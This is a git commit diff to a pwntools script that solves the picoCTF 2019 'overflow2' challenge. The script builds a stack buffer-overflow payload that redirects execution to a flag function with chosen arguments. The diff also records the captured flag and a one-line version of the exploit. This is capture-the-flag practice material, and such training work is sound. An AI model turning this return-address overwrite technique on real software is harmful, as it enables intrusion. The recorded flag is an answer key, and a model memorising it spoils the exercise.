e48f2f7b8458825c32285b76f7a3bf4a3410d741
Alejandro Jacobo <72319598+X3ZN1EL@users.noreply.github.com>
2021-08-18 15:50:58 -0500

    Update overflow2.py

--- picoctf2019/overflow2.py
+++ picoctf2019/overflow2.py
@@ -6,14 +6,14 @@ s = process("./vuln")
 
 offset = 188
 flag_addr = 0x080485e6
-nops = b"\x90"*4
+main_func = 0x080486b5
 arg1 = 0xdeadbeef
 arg2 = 0xc0ded00d
 
 s.recvuntil('Please enter your string:')
 payload = b'A'*offset
 payload += p32(flag_addr)
-payload += nops
+payload += p32(main_func)
 payload += p32(arg1)
 payload += p32(arg2)
 
@@ -21,4 +21,4 @@ s.sendline(payload)
 s.interactive()
 
 # picoCTF{arg5_and_r3turn598632d70}
-# python -c 'from pwn import *; payload = (b"A"*188 + p32(0x080485e6) + b"\x90"*4 + p32(0xdeadbeef) + p32(0xc0ded00d)); print(payload)' | ./vuln
+# python -c 'from pwn import *; payload = (b"A"*188 + p32(0x080485e6) + p32(0x080486b5) + p32(0xdeadbeef) + p32(0xc0ded00d)); print(payload)' | ./vuln
